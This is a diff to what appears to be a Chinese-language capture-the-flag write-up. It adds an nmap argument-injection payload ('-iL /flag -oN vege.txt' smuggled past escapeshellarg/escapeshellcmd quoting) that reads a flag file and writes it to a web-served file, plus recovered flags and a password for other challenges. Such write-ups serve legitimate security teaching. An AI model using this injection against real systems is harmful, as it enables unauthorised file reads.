@@ -182,9 +182,18 @@ flag为flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}
 
 [escapeshellarg()+escapeshellcmd()](https://paper.seebug.org/164/)
 
+方法 1.1
+
 127.0.0.1' -iL /flag -oN vege.txt '
 
-`nmap 127.0.0.1' -iL /flag -oN vege.txt '`
+即执行 `nmap 127.0.0.1' -iL /flag -oN vege.txt '`
+
+然后访问 http://challenge-xxxxx/vege.txt
+
+方法 1.2
+
+输入' -oN aa.txt '，让后访问/aa.txt
+
 
 单引号逃逸，源代码中
 
@@ -319,13 +328,18 @@ def decrypt(s):
 
 [decrypt(x) for x in lst]
 # print hex(int(r,2))[2:-1].decode('hex')
+# Sakura_Love_Strawberry
+
+用 Sakura_Love_Strawberry 来解压得到flag
+# flag{061056cc-980c-4214-b163-230e5cd5c78e}
 ```
 
 ## Crypto
 ### simple
 
 ```python
-a = 123456 b = 321564,只需要遍历一下字母
+a = 123456
+b = 321564 #只需要遍历一下字母
 
 #cipher = 'kgwsmucmuekkwemeeww'
 cipher = [10, 6, 22, 18, 12, 20, 2, 12, 20, 4, 10, 10, 22, 4, 12, 4, 4, 22,22]
